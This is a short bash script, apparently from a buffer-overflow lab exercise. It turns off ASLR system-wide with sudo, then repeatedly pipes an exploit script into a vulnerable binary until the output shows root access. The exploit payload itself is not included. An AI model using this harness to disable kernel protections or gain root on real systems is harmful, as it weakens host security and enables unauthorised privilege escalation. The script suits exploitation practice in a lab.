#!/usr/bin/bash

echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

count=0
while (( 1 ))
do
  mate-terminal -e 'bash -c "python exploit.py|./bof > a;"'
  (( count ++ ))
  printf "Pass :: %05d\r" $count
  if [[ $(grep -c root a) -ge 1 ]]
  then
    exit
  fi
done
